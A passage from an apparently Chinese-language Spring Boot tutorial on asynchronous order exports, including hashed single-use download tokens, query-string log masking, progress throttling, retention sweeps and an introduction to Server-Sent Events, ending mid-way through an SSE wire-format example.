        } else {
            builder.cacheControl(CacheControl.noStore())
                   .header(HttpHeaders.RETRY_AFTER,
                           String.valueOf(retryAfterFor(job).toSeconds()));
        }
        return builder.body(body);
    }

    /**
     * 下載結果檔案。
     *
     * <p>★ 這條端點的 URL 可以帶一個 {@code token} 查詢參數（5.10.6）。
     * 為什麼需要它（而不是只用 {@code Authorization} header）：
     * <ul>
     *   <li>使用者會把連結貼進瀏覽器位址欄（沒有 header）。</li>
     *   <li>HTML 的 {@code <a download>} 無法帶自訂 header。</li>
     *   <li>Excel / Power BI 的「從網頁取得資料」也不方便帶 header。</li>
     *   <li>通知信裡的連結必須自帶憑證。</li>
     * </ul>
     *
     * <p>⚠️ 但 URL 裡的憑證有風險（會進瀏覽器歷史、進 referrer、進 log），
     * 所以 token 必須是<b>一次性、短期、與單一檔案綁定</b>的（5.10.6）。
     */
    @GetMapping("/{exportId}/file")
    public ResponseEntity<Resource> download(
            @PathVariable("exportId") @Pattern(regexp = "^exp_[0-9a-z]{26}$") String exportId,
            @RequestParam(value = "token", required = false) String token,
            @CurrentActor Actor actor,
            jakarta.servlet.http.HttpServletRequest request) {

        // ★ 兩種授權都接受：一次性 token 或正常的 Bearer 認證
        var downloadable = (token != null)
                ? exportService.resolveByToken(exportId, token, clientIp(request))
                : exportService.resolveForActor(exportId, actor);

        if (!properties.download().proxyThroughApplication()) {
            return ResponseEntity.status(HttpStatus.FOUND)
                    .location(exportService.presignedUrl(downloadable))
                    .cacheControl(CacheControl.noStore())
                    // ★ 302 也要防 referrer 洩漏（Location 裡有簽章）
                    .header("Referrer-Policy", "no-referrer")
                    .build();
        }

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.parseMediaType(downloadable.contentType()));
        headers.setContentLength(downloadable.sizeBytes());
        ContentDispositions.apply(headers, false, downloadable.filename());
        headers.setCacheControl(CacheControl.noStore());
        headers.add("Referrer-Policy", "no-referrer");
        // ★ 讓客戶端能驗證下載完整性（比 Content-Length 強：它能偵測內容損毀）
        headers.set("X-Content-SHA256", downloadable.sha256());
        headers.set("X-Row-Count", String.valueOf(downloadable.rowCount()));

        return new ResponseEntity<>(
                exportService.openResource(downloadable), headers, HttpStatus.OK);
    }

    /**
     * 取消（未完成時）或刪除（已完成時）。
     *
     * <p>★ 同一個動詞對應兩種語意，這是刻意的：對使用者來說
     * 「我不要這個匯出了」是同一件事，不該要求他先判斷狀態。
     *
     * <p>★ 回 {@code 204} 而且<b>對已經不存在的 id 也回 204</b>
     * （冪等的 DELETE，03-rest-api 2.6.3）。
     */
    @DeleteMapping("/{exportId}")
    public ResponseEntity<Void> cancelOrDelete(
            @PathVariable("exportId") @Pattern(regexp = "^exp_[0-9a-z]{26}$") String exportId,
            @CurrentActor Actor actor) {
        exportService.cancelOrDelete(exportId, actor);
        return ResponseEntity.noContent().build();
    }

    /** 我的匯出歷史。 */
    @GetMapping
    public PageResponse<OrderExportSummary> list(
            @RequestParam(value = "status", required = false) ExportStatus status,
            Pageable pageable,
            @CurrentActor Actor actor) {
        return mapper.toPage(exportService.search(actor, status, pageable));
    }

    /**
     * 動態的 {@code Retry-After}。
     *
     * <p>★ 為什麼不是固定值：
     * <ul>
     *   <li>剛建立（QUEUED）→ 5 秒（可能很快就開始）。</li>
     *   <li>執行中 → 依剩餘量估算（3～30 秒）。</li>
     *   <li>快完成（&gt; 90%）→ 3 秒（密集一點，讓使用者早點看到結果）。</li>
     * </ul>
     * 這讓「一個跑 90 秒的匯出」被輪詢約 6 次，而不是 900 次。
     */
    static Duration retryAfterFor(OrderExportJob job) {
        if (job.status() == ExportStatus.QUEUED) return Duration.ofSeconds(5);

        var progress = job.progress();
        if (progress == null || progress.totalRows() <= 0) return Duration.ofSeconds(5);
        if (progress.percent() >= 90) return Duration.ofSeconds(3);

        // 依已完成的速率估算剩餘時間，取其 1/4（讓客戶端問 4 次左右就到）
        if (job.startedAt() != null && progress.processedRows() > 0) {
            long elapsedMs = Duration.between(job.startedAt(), Instant.now()).toMillis();
            double rowsPerMs = (double) progress.processedRows() / Math.max(elapsedMs, 1);
            long remainingMs = (long) ((progress.totalRows() - progress.processedRows())
                    / Math.max(rowsPerMs, 1e-9));
            long suggested = Math.max(3, Math.min(30, remainingMs / 4000));
            return Duration.ofSeconds(suggested);
        }
        return Duration.ofSeconds(5);
    }

    private static String clientIp(jakarta.servlet.http.HttpServletRequest request) {
        // ⚠️ 這裡刻意不自己解析 X-Forwarded-For（04 章 4.5.4 的坑）。
        //    真正的實作應該注入 ClientIpResolver（04 章 4.13.6）。
        return request.getRemoteAddr();
    }
}
```

### 5.10.5 請求與回應 DTO

```java
package example.shop.order.web.dto;

import example.shop.common.validation.SortWhitelist;
import example.shop.order.domain.OrderStatus;
import jakarta.validation.Valid;
import jakarta.validation.constraints.*;

import java.util.List;
import java.util.Set;

/**
 * 建立匯出工作的請求。
 *
 * <p>★ 這個 DTO 的驗證比一般端點嚴格得多，理由是
 * <b>匯出工作會消耗大量資源</b>（幾分鐘的 CPU、幾百 MB 的 I/O、幾十 MB 的儲存）。
 * 一個沒有驗證的匯出端點就是一個 DoS 入口。
 */
public record CreateExportRequest(

    @NotNull
    ExportFormat format,

    /**
     * 篩選條件。
     *
     * <p>⚠️ {@code @Valid} 是必須的 —— 沒有它，巢狀物件的驗證註解<b>完全不會執行</b>
     * （02 章 2.5.3 的經典陷阱）。
     */
    @NotNull @Valid
    ExportFilter filter,

    /**
     * 要匯出哪些欄位。
     *
     * <p>★ 白名單而不是「任意欄位名」：
     * 讓客戶端指定任意欄位等於讓它讀取任何資料
     * （包括 {@code internalNote}、{@code costPrice} 這種不該對外的欄位）。
     *
     * <p>⚠️ 這個 regex 很長，但它是一份「對外契約」——
     * 加欄位要經過 code review，這正是我們要的。
     * （替代方案是把清單放進 {@code ExportColumn} enum，
     * 讓 Spring 的 enum 轉換來擋掉未知值 —— 那樣錯誤訊息更好，
     * 但 enum 的名稱與 JSON 的欄位名要維持對應，見 06 章 6.5.8。）
     */
    @NotEmpty(message = "至少要選一個欄位")
    @Size(max = 40, message = "最多 40 個欄位")
    List<@Pattern(regexp = "^(orderId|customerId|customerName|customerEmail|status|"
                         + "itemCount|subtotal|shippingFee|discount|total|currency|"
                         + "paymentMethod|shippingMethod|createdAt|paidAt|shippedAt|"
                         + "deliveredAt|cancelledAt|invoiceNumber|couponCode)$",
                  message = "不支援的欄位") String> columns,

    /** 完成後寄通知信。選填。 */
    @Email @Size(max = 254)
    String notifyEmail

) {
    public enum ExportFormat { CSV, XLSX, NDJSON }

    /**
     * 匯出的篩選條件。
     *
     * <p>★ 與 {@code OrderFilter}（01 章 1.7.4）刻意分開的兩個理由：
     * <ol>
     *   <li>匯出<b>必須</b>有日期範圍（不能匯出「全部訂單」），
     *       而查詢端點沒有這個限制。</li>
     *   <li>匯出不需要分頁參數。</li>
     * </ol>
     */
    public record ExportFilter(

        /** ★ 必填 —— 沒有下界的匯出等於「掃全表」。 */
        @NotNull
        java.time.LocalDate createdFrom,

        @NotNull
        java.time.LocalDate createdTo,

        @Size(max = 10)
        Set<OrderStatus> status,

        @Size(max = 50)
        List<@Pattern(regexp = "^cus_[0-9A-Za-z]{1,32}$") String> customerIds,

        @SortWhitelist({"createdAt", "total", "status"})
        String sort

    ) {
        /**
         * ★ 跨欄位驗證：範圍不能超過 366 天。
         *
         * <p>理由（一個實際算過的數字）：
         * 一年約 500 萬筆訂單，而 <b>xlsx 的列上限是 1,048,576</b> ——
         * 所以「一年」在 xlsx 格式上本來就辦不到。
         * 這個驗證讓使用者<b>現在</b>就知道，而不是等 20 分鐘後看到 FAILED。
         */
        @AssertTrue(message = "日期範圍不可超過 366 天")
        public boolean isRangeWithinOneYear() {
            if (createdFrom == null || createdTo == null) return true;
            return !createdFrom.isAfter(createdTo)
                    && java.time.temporal.ChronoUnit.DAYS
                            .between(createdFrom, createdTo) <= 366;
        }

        @AssertTrue(message = "起始日不可晚於結束日")
        public boolean isRangeOrdered() {
            if (createdFrom == null || createdTo == null) return true;
            return !createdFrom.isAfter(createdTo);
        }

        @AssertTrue(message = "結束日不可是未來")
        public boolean isNotFuture() {
            return createdTo == null
                    || !createdTo.isAfter(java.time.LocalDate.now(java.time.ZoneOffset.UTC));
        }
    }
}
```

```java
package example.shop.order.web.dto;

import com.fasterxml.jackson.annotation.JsonInclude;
import com.fasterxml.jackson.annotation.JsonPropertyOrder;

import java.time.Instant;

/**
 * 匯出工作的狀態回應。
 *
 * <p>★ 三個「互斥」的欄位：{@code result}（成功時）、{@code error}（失敗時）、
 * 兩者都 null（進行中）。
 *
 * <p>⚠️ 為什麼不用 sealed interface + 三個子型別（那樣型別更精確）：
 * <b>因為 OpenAPI 的 oneOf 在很多客戶端產生器上支援很差</b>
 * （03-rest-api 7.6.3）。一個帶 optional 欄位的物件對客戶端友善得多。
 * 型別精確度的損失由 {@code status} 欄位補回來（它明確說了現在是哪個狀態）。
 */
@JsonInclude(JsonInclude.Include.NON_NULL)
@JsonPropertyOrder({"exportId", "status", "format", "progress",
                    "result", "error",
                    "createdAt", "startedAt", "completedAt", "expiresAt", "statusUrl"})
public record OrderExportResponse(

    String exportId,
    String status,
    String format,

    Progress progress,

    /** 只有 {@code SUCCEEDED} 時有值。 */
    Result result,

    /** 只有 {@code FAILED} 時有值。 */
    Error error,

    Instant createdAt,
    Instant startedAt,
    Instant completedAt,
    Instant expiresAt,

    /** ★ 給客戶端的 self link —— 它不用自己組 URL。 */
    String statusUrl

) {
    /**
     * @param totalRows 預估總筆數（開始前用 COUNT 算）
     * @param percent   0～100 的整數（★ 不用 double：前端只會顯示整數，
     *                  而 double 在 JSON 裡會出現 45.000000000000004）
     */
    public record Progress(long processedRows, long totalRows, int percent) {

        public static Progress of(long processed, long total) {
            int percent = (total <= 0) ? 0
                    : (int) Math.min(100, Math.round(processed * 100.0 / total));
            return new Progress(processed, total, percent);
        }
    }

    public record Result(
        String downloadUrl,
        String filename,
        long sizeBytes,
        long rowCount,
        String contentType,
        String sha256,
        Instant expiresAt
    ) {}

    /**
     * 失敗資訊。
     *
     * <p>★ 欄位刻意與 {@code Problem}（03 章 3.6.2）一致，
     * 讓前端可以用同一套元件顯示「HTTP 錯誤」與「工作失敗」。
     *
     * <p>⚠️ 沒有 {@code detail}（英文技術訊息）—— 因為工作失敗的原因
     * 可能含內部資訊（SQL、連線字串）。只給 {@code userMessage} 與 {@code traceId}，
     * 技術細節留在伺服器日誌（03 章 3.11.1 的同一條原則）。
     */
    public record Error(
        String code,
        String userMessage,
        boolean retryable,
        String traceId
    ) {}
}
```

### 5.10.6 一次性下載 token

**問題**：下載連結會被使用者貼到 Slack、寄 email、存書籤。
如果它是「只要有連結就能下載」，那**含 41 萬筆客戶個資的檔案就在到處流傳**。

```java
package example.shop.order.service;

import example.shop.common.audit.AuditEvent;
import example.shop.common.audit.AuditRepository;
import example.shop.common.error.ErrorCode;
import example.shop.common.upload.UploadProperties;
import example.shop.common.upload.UploadRejectedException;
import example.shop.common.web.TraceContext;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;

import java.security.MessageDigest;
import java.security.SecureRandom;
import java.time.Duration;
import java.time.Instant;
import java.util.HexFormat;
import java.util.Map;
import java.util.Optional;

/**
 * 匯出檔案的一次性下載 token。
 *
 * <p>★ 五個設計決定：
 * <ol>
 *   <li><b>與單一 exportId 綁定</b> —— 一個 token 不能下載別的檔案。</li>
 *   <li><b>短期</b>（15 分鐘）—— 貼到 Slack 也很快就失效。</li>
 *   <li><b>次數上限</b>（3 次）—— 允許重試（網路中斷）但不允許無限傳播。
 *       ⚠️ 不設 1 次的理由：下載被中斷時使用者會重試，
 *       而「一次就失效」會讓他必須回去重新申請，體驗很糟。</li>
 *   <li><b>資料庫存 hash 不存原文</b> —— 資料庫被讀取（SQL injection、備份洩漏）
 *       時 token 不可用。和密碼一樣的道理。</li>
 *   <li><b>每次使用都寫稽核</b> —— 「誰在什麼時候下載了含 41 萬筆個資的檔案」
 *       是必須留紀錄的。</li>
 * </ol>
 */
@Component
public class DownloadTokenService {

    private static final Logger log = LoggerFactory.getLogger(DownloadTokenService.class);

    private static final SecureRandom RANDOM = new SecureRandom();
    private static final HexFormat HEX = HexFormat.of();
    private static final int MAX_USES = 3;

    /** "dl_" + 64 個 hex 字元 */
    private static final int TOKEN_LENGTH = 3 + 64;

    private final DownloadTokenRepository repository;
    private final AuditRepository auditRepository;
    private final Duration ttl;

    public DownloadTokenService(DownloadTokenRepository repository,
                                AuditRepository auditRepository,
                                UploadProperties properties) {
        this.repository = repository;
        this.auditRepository = auditRepository;
        this.ttl = properties.download().downloadTokenTtl();
    }

    /**
     * 簽發一個 token。
     *
     * @return 原文 token（<b>只在這裡出現一次</b>，資料庫存的是 hash）
     */
    public String issue(String exportId, String actorId) {
        byte[] raw = new byte[32];               // 256 bit
        RANDOM.nextBytes(raw);
        // ★ 前綴 "dl_" 讓它在 log 與 git 掃描器裡一眼可辨
        String token = "dl_" + HEX.formatHex(raw);

        repository.save(new DownloadToken(
                sha256(token),                   // ★ 只存 hash
                exportId,
                actorId,
                Instant.now().plus(ttl),
                0,
                MAX_USES));
        return token;
    }

    /**
     * 驗證並消耗一次使用。
     *
     * <p>⚠️ 「消耗」必須是<b>原子</b>的：
     * <pre>
     * UPDATE download_token
     *    SET use_count = use_count + 1, last_used_at = ?
     *  WHERE token_hash = ? AND export_id = ?
     *    AND expires_at &gt; ? AND use_count &lt; max_uses
     * </pre>
     * 用「受影響列數」判斷成功。
     * 先 SELECT 再 UPDATE 會讓兩個併發請求都通過檢查
     * → 一個 3 次的 token 被用 4 次（04 章 4.9.1 的競態 1 是同一個問題）。
     */
    public ValidatedDownload consume(String exportId, String token, String clientIp) {

        // ★ 格式檢查先做 —— 避免對明顯無效的值去查資料庫（也避免 timing 差異）
        if (token == null || !token.startsWith("dl_") || token.length() != TOKEN_LENGTH) {
            throw invalid();
        }

        String hash = sha256(token);
        Optional<DownloadToken> consumed =
                repository.tryConsume(hash, exportId, Instant.now());

        if (consumed.isEmpty()) {
            // ⚠️ 三種失敗（不存在 / 過期 / 次數用完）對外回同一個錯誤 ——
            //    區分它們會給攻擊者資訊（「這個 token 存在但過期了」）。
            //    ★ 但日誌裡要區分，否則客服無法幫使用者除錯。
            repository.findByHash(hash).ifPresentOrElse(
                    t -> log.info("下載 token 無效 reason={} exportId={} uses={}/{}",
                            t.expiresAt().isBefore(Instant.now()) ? "expired" : "exhausted",
                            exportId, t.useCount(), t.maxUses()),
                    () -> log.info("下載 token 不存在或不屬於此 export exportId={}", exportId));
            throw invalid();
        }

        DownloadToken t = consumed.get();

        // ★ 稽核：這是「誰下載了個資檔案」的唯一紀錄
        auditRepository.save(new AuditEvent(
                TraceContext.current(), "GET",
                "/order-exports/{exportId}/file",
                "/order-exports/%s/file".formatted(exportId),
                null, 200, 0, Instant.now(), t.actorId(), clientIp));

        return new ValidatedDownload(exportId, t.actorId(), t.useCount() + 1, t.maxUses());
    }

    private static UploadRejectedException invalid() {
        return new UploadRejectedException(ErrorCode.RESOURCE_GONE,
                "The download link is invalid or has expired.",
                Map.of("hint", "下載連結已失效。請回到匯出頁面重新取得連結。"));
    }

    private static String sha256(String s) {
        try {
            var digest = MessageDigest.getInstance("SHA-256");
            return HEX.formatHex(digest.digest(
                    s.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
        } catch (java.security.NoSuchAlgorithmException e) {
            throw new IllegalStateException("SHA-256 不可用", e);   // 不可能發生
        }
    }

    public record ValidatedDownload(String exportId, String actorId,
                                    int usedCount, int maxUses) {}
}
```

⚠️ **token 不能出現在日誌裡**。04 章的請求日誌會記錄 URI，而 token 在 query string 裡：

```
# 🔴 這一行讓 token 進了 Loki，保留 30 天
2026-08-24 03:16:12 INFO RequestLoggingFilter - GET /order-exports/exp_01k39w/file?token=dl_9f3a2b8c...
```

**修法：04 章的請求日誌用「路徑模板」而不是實際 URI**（4.6.3 已經這樣做了），
但很多地方還是會記完整 URI（稽核紀錄、Nginx access log、APM），所以要一個遮蔽器：

```java
package example.shop.common.web;

import java.util.Set;

/**
 * Query string 的遮蔽（04 章 4.6.4 的 {@code BodyMasker} 在 query string 上的對應物）。
 *
 * <p>⚠️ 為什麼需要它：body 的遮蔽通常做得很仔細，
 * 但 <b>URI 常常被原封不動地記錄</b>，而敏感值也會出現在 query string 裡：
 * {@code ?token=...}、{@code ?email=...}、{@code ?apiKey=...}。
 */
public final class QueryMasker {

    private static final Set<String> SENSITIVE = Set.of(
            "token", "accesstoken", "refreshtoken", "apikey",
            "password", "secret", "signature", "sig", "code",
            "email", "phone", "idnumber", "cardnumber", "cvv");

    private static final String MASK = "***";

    public static String mask(String queryString) {
        if (queryString == null || queryString.isEmpty()) return queryString;

        StringBuilder out = new StringBuilder(queryString.length());
        for (String pair : queryString.split("&")) {
            if (out.length() > 0) out.append('&');
            int eq = pair.indexOf('=');
            if (eq < 0) {
                out.append(pair);
                continue;
            }
            String key = pair.substring(0, eq);
            out.append(key).append('=');
            // ★ 比對用小寫並移除底線／連字號，
            //   讓 access_token / accessToken / access-token 都命中
            String normalized = key.toLowerCase().replace("_", "").replace("-", "");
            out.append(SENSITIVE.contains(normalized) ? MASK : pair.substring(eq + 1));
        }
        return out.toString();
    }

    private QueryMasker() {}
}
```

```java
class QueryMaskerTest {

    @ParameterizedTest
    @CsvSource(delimiter = '|', value = {
        "token=dl_9f3a                    | token=***",
        "access_token=abc&page=1          | access_token=***&page=1",
        "accessToken=abc                  | accessToken=***",
        "ACCESS-TOKEN=abc                 | ACCESS-TOKEN=***",
        "email=a@b.com&status=PAID        | email=***&status=PAID",
        "page=1&size=20                   | page=1&size=20",
        "flag                             | flag",
        "token=                           | token=***",
    })
    void 遮蔽(String input, String expected) {
        assertThat(QueryMasker.mask(input)).isEqualTo(expected);
    }

    @Test
    void nullAndEmpty() {
        assertThat(QueryMasker.mask(null)).isNull();
        assertThat(QueryMasker.mask("")).isEmpty();
    }
}
```

**下載連結該用哪一種？** 三個選項的對照：

| 方案 | 連結長什麼樣 | 洩漏後的風險 | 適用 |
|---|---|---|---|
| Bearer token（無 URL 憑證） | `/order-exports/exp_1/file` | ✅ 無（沒有 token 就下載不了） | 前端用 `fetch` + `blob` 下載 |
| **一次性 token** | `/order-exports/exp_1/file?token=dl_9f…` | ⚠️ 15 分鐘內 3 次 | ✅ shop-service 的預設 |
| 預簽名 S3 URL | `https://s3…?X-Amz-Signature=…` | ⚠️ TTL 內無限次 | 檔案很大、不需要精細稽核 |

⚠️ **「前端用 `fetch` + `blob`」其實是最安全的**，因為完全沒有 URL 憑證：

```javascript
// 前端的正確下載方式（不需要 URL token）
const response = await fetch(`/order-exports/${exportId}/file`, {
  headers: { Authorization: `Bearer ${accessToken}` }
});
if (!response.ok) {
  const problem = await response.json();      // 03 章的 Problem JSON
  showError(problem.userMessage);
  return;
}
const blob = await response.blob();
const url = URL.createObjectURL(blob);
const a = document.createElement('a');
a.href = url;
a.download = filenameFromContentDisposition(response.headers);
a.click();
URL.revokeObjectURL(url);                     // ★ 一定要 revoke，否則記憶體洩漏
```

**但它有一個硬缺點：整個檔案要先進瀏覽器的記憶體。**
24 MB 的 xlsx 沒問題，**500 MB 的檔案會讓瀏覽器分頁崩潰**。

**所以 shop-service 兩種都支援**：

| 檔案大小 | 前端行為 |
|---|---|
| < 50 MB | `fetch` + blob（無 URL 憑證，最安全） |
| > 50 MB | 先呼叫 `GET /order-exports/{id}` 拿 `result.downloadUrl`（含一次性 token），再讓瀏覽器原生下載（可續傳、有進度條） |

### 5.10.7 進度回報：兩個併發問題

```java
package example.shop.order.service;

/**
 * 匯出工作的進度更新。
 *
 * <p>⚠️ 兩個容易做錯的地方：
 * <ol>
 *   <li><b>更新太頻繁</b> —— 每筆都 UPDATE 一次資料庫 = 41 萬次 UPDATE，
 *       比匯出本身還慢。</li>
 *   <li><b>進度的交易邊界</b> —— 如果進度更新和匯出在同一個交易裡，
 *       <b>使用者在工作完成前看不到任何進度</b>（未提交的資料讀不到）。</li>
 * </ol>
 */
public class ExportProgressReporter {

    /** 每處理這麼多筆才寫一次進度。 */
    private static final int REPORT_EVERY = 2_000;

    /** 或者至少每這麼久寫一次（處理很慢時也要有進度）。 */
    private static final long REPORT_INTERVAL_MS = 3_000;

    private final OrderExportRepository repository;

    private long lastReportedRows;
    private long lastReportedAt;

    public ExportProgressReporter(OrderExportRepository repository) {
        this.repository = repository;
        this.lastReportedAt = System.currentTimeMillis();
    }

    /**
     * 回報進度。
     *
     * <p>★ {@code REQUIRES_NEW} 是關鍵：進度更新必須在<b>自己的交易</b>裡
     * 立刻提交，否則使用者要等整個匯出結束才看得到進度
     * （05-service 第 02 章會詳談交易傳播）。
     */
    @org.springframework.transaction.annotation.Transactional(
            propagation = org.springframework.transaction.annotation.Propagation.REQUIRES_NEW)
    public void report(String exportId, long processedRows, long totalRows) {

        long now = System.currentTimeMillis();
        boolean enoughRows = processedRows - lastReportedRows >= REPORT_EVERY;
        boolean enoughTime = now - lastReportedAt >= REPORT_INTERVAL_MS;

        if (!enoughRows && !enoughTime) {
            return;                     // ★ 節流
        }

        repository.updateProgress(exportId, processedRows, totalRows, java.time.Instant.now());
        lastReportedRows = processedRows;
        lastReportedAt = now;
    }

    /**
     * 檢查是否被取消。
     *
     * <p>★ 為什麼要在匯出過程中檢查：使用者按了取消，
     * 而工作還要跑 80 秒 —— 不檢查的話取消完全沒有效果。
     *
     * <p>⚠️ 這個查詢也要節流（每 2000 筆一次），
     * 而且要用 {@code REQUIRES_NEW}（要讀到別的交易已提交的取消狀態）。
     */
    @org.springframework.transaction.annotation.Transactional(
            propagation = org.springframework.transaction.annotation.Propagation.REQUIRES_NEW,
            readOnly = true)
    public boolean isCancelled(String exportId) {
        return repository.findStatus(exportId)
                .map(s -> s == example.shop.order.domain.ExportStatus.CANCELLED)
                .orElse(true);          // ★ 查不到 = 被刪了 = 當作取消
    }
}
```

⚠️ **`orElse(true)` 值得說明**：如果工作紀錄不見了（被刪、資料庫被清），
**繼續跑是浪費資源** —— 因為完成後也沒地方寫結果。
把「查不到」當成「取消」是正確的保守選擇。

**進度更新的成本試算**：

| 策略 | UPDATE 次數（41 萬筆） | 額外耗時 |
|---|---|---|
| 每筆更新 | 410,233 | 🔴 約 +680 秒（比匯出本身慢 7 倍） |
| 每 100 筆 | 4,103 | 約 +7 秒 |
| **每 2000 筆** | **206** | **約 +0.3 秒** ✅ |
| 只在開始與結束 | 2 | ✅ 但沒有進度可看 |

**每 2000 筆 ≈ 每 0.4 秒一次**，對「使用者盯著進度條」已經非常足夠。

### 5.10.8 檔案的生命週期與清理

```java
package example.shop.order.service;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.time.Duration;
import java.time.Instant;

/**
 * 匯出檔案的清理。
 *
 * <p>★ 為什麼一定要有：一份 24 MB 的 xlsx × 每天 30 份 × 永久保留
 * = 一年 260 GB 的 S3 費用，而且<b>那些檔案含大量個資</b>
 * （保留越久，洩漏的風險曝露越大）。
 *
 * <p>⚠️ 「刪除物件」與「更新紀錄狀態」不能只做一半：
 * <ul>
 *   <li>只刪物件 → 使用者點下載得到 500（紀錄說 SUCCEEDED 但檔案不在）。</li>
 *   <li>只改狀態 → 物件永遠留著（花錢 + 個資風險）。</li>
 * </ul>
 * 所以順序是：<b>先改狀態（讓下載端點回 410），再刪物件</b>。
 * 反過來的話中間那段時間會回 500。
 */
@Component
public class ExportRetentionSweeper {

    private static final Logger log = LoggerFactory.getLogger(ExportRetentionSweeper.class);

    /** 成功的匯出保留 7 天。 */
    private static final Duration SUCCESS_RETENTION = Duration.ofDays(7);

    /** 失敗的紀錄保留 30 天（除錯用；沒有檔案要刪）。 */
    private static final Duration FAILURE_RETENTION = Duration.ofDays(30);

    /** 卡在 RUNNING 超過這麼久 = worker 掛了。 */
    private static final Duration STUCK_THRESHOLD = Duration.ofHours(2);

    private final OrderExportRepository repository;
    private final ObjectStorage storage;

    public ExportRetentionSweeper(OrderExportRepository repository, ObjectStorage storage) {
        this.repository = repository;
        this.storage = storage;
    }

    /** 每小時整點過 7 分執行（避開整點的其他排程）。 */
    @Scheduled(cron = "0 7 * * * *")
    public void sweep() {
        expireOldFiles();
        recoverStuckJobs();
    }

    private void expireOldFiles() {
        Instant cutoff = Instant.now().minus(SUCCESS_RETENTION);
        var expired = repository.findSucceededBefore(cutoff, 500);

        for (var job : expired) {
            try {
                // ★ 順序：先標記，再刪檔（見類別 javadoc）
                repository.markExpired(job.exportId());
                if (job.storageKey() != null) {
                    storage.delete(job.storageKey());
                }
                // 一併撤銷還沒過期的下載 token
                repository.revokeDownloadTokens(job.exportId());
            } catch (Exception e) {
                // ★ 單筆失敗不能中斷整批（下一輪會再試）
                log.warn("清理匯出檔案失敗 exportId={}", job.exportId(), e);
            }
        }
        if (!expired.isEmpty()) {
            log.info("清理過期匯出 count={}", expired.size());
        }
    }

    /**
     * 復原卡住的工作。
     *
     * <p>★ 為什麼需要：worker 被 SIGKILL（部署、OOM、節點被驅逐）時，
     * 工作會永遠停在 {@code RUNNING} —— 使用者會一直輪詢，
     * 而且看到的進度永遠是 45%。
     *
     * <p>⚠️ 「多久算卡住」要大於「最慢的匯出」。
     * 這裡用 2 小時，而 366 天的匯出實測約 25 分鐘 —— 有足夠餘裕。
     */
    private void recoverStuckJobs() {
        Instant cutoff = Instant.now().minus(STUCK_THRESHOLD);
        var stuck = repository.findRunningWithHeartbeatBefore(cutoff, 100);

        for (var job : stuck) {
            log.error("匯出工作卡住，標記為失敗 exportId={} lastHeartbeat={} progress={}",
                      job.exportId(), job.lastHeartbeatAt(), job.processedRows());
            repository.markFailed(job.exportId(),
                    "SERVICE_UNAVAILABLE",
                    "匯出過程中斷，請重新建立匯出工作。");
        }
        if (!stuck.isEmpty()) {
            // ★ ERROR 等級 + 告警：這代表有 worker 在異常結束
            log.error("復原卡住的匯出工作 count={}", stuck.size());
        }
    }
}
```

⚠️ **`lastHeartbeatAt` 是必要的欄位**。用 `startedAt` 判斷卡住是錯的：

```
一個跑 25 分鐘的正常匯出：startedAt 是 25 分鐘前
                        → 如果 STUCK_THRESHOLD 是 20 分鐘，它會被誤判為卡住 🔴

用 lastHeartbeatAt（每 2000 筆更新一次）：
  正常工作 → heartbeat 一直在更新 → 永遠不會被誤判
  掛掉的 worker → heartbeat 停住 → 2 小時後被回收 ✅
```

**進度更新（5.10.7）順便就是 heartbeat** —— 不需要額外的機制。

---

## 5.11 SSE：Server-Sent Events

### 5.11.1 SSE vs WebSocket vs 輪詢

**需求**：訂單狀態改變時（已付款 → 已出貨 → 已送達）即時通知瀏覽器。

| 面向 | 短輪詢 | 長輪詢 | **SSE** | WebSocket |
|---|---|---|---|---|
| 方向 | 客戶端拉 | 客戶端拉 | **伺服器推**（單向） | 雙向 |
| 協定 | HTTP | HTTP | **HTTP**（`text/event-stream`） | 升級成 `ws://` |
| Spring MVC 支援 | 原生 | `DeferredResult` | **`SseEmitter`**（原生） | 需要 `spring-websocket` |
| 自動重連 | N/A | 要自己寫 | ✅ **瀏覽器內建** | 要自己寫 |
| 斷線續傳 | N/A | ❌ | ✅ **`Last-Event-ID`** | 要自己寫 |
| 經過代理 / LB | ✅ 沒問題 | ⚠️ | ⚠️ **要設定**（5.11.7） | 🔴 常常要額外設定 |
| 經過 HTTP/1.1 的連線數限制 | ✅ | ⚠️ | 🔴 **同網域 6 條**（見下） | ✅ 不受限 |
| 需要認證 | ✅ 一般 header | ✅ | ⚠️ **EventSource 不能帶 header** | ⚠️ 只能在 URL 或第一個訊息 |
| 二進位 | ✅ | ✅ | 🔴 **只能文字**（要 base64） | ✅ |
| 伺服器資源 | 低（但請求數多） | 中 | 中（每個連線一個 emitter） | 中 |
| 複雜度 | 最低 | 中 | **低** | 高 |

⚠️ **「同網域 6 條連線」是 SSE 最實際的限制**：

```
HTTP/1.1 的瀏覽器對同一個 origin 最多 6 條並行連線。
使用者開了 7 個訂單詳情頁 → 每頁一個 SSE 連線
  → 第 7 個 SSE 永遠連不上
  → 而且前 6 條 SSE 佔滿了配額，該頁的其他 API 請求也全部卡住 🔴
```

**三個解法**：

| 解法 | 說明 |
|---|---|
| **用 HTTP/2** ★ | HTTP/2 的多工讓連線數限制消失（一條 TCP 連線可以有上百個 stream）。**這是正解**，而且 Nginx + TLS 開 HTTP/2 只需要一行設定 |
| 一個全站共用的 SSE 連線 | `GET /me/events` 推送所有事件，前端用 `event:` 型別分流。⚠️ 需要前端有一個事件總線 |
| 用 `SharedWorker` | 多個分頁共用一條連線。⚠️ Safari 支援較差 |

**shop-service 的決定**：

| 需求 | 選擇 | 理由 |
|---|---|---|
| 訂單狀態即時更新（顧客端） | **SSE** + HTTP/2 | 單向推送，瀏覽器自動重連是巨大的優勢 |
| 匯出工作進度 | **輪詢**（5.10） | 有 `Retry-After` 指引，輪詢 6 次就完成，不值得開一條長連線 |
| 客服的即時聊天 | WebSocket（09 站以後） | 真的需要雙向 |
| 倉庫掃描槍的即時看板 | **SSE** | 單向，而且掃描槍的瀏覽器很舊，WebSocket 支援不確定 |

### 5.11.2 wire format

**SSE 的協定極簡** —— 這是它相對 WebSocket 的最大優勢：

```http
GET /orders/ord_01k1/events HTTP/1.1
Accept: text/event-stream
Last-Event-ID: evt_00042

HTTP/1.1 200 OK
Content-Type: text/event-stream;charset=UTF-8
Cache-Control: no-cache, no-store
Connection: keep-alive
X-Accel-Buffering: no

: connected                                        ← 註解（心跳用）

id: evt_00043
event: order.status.changed
retry: 3000
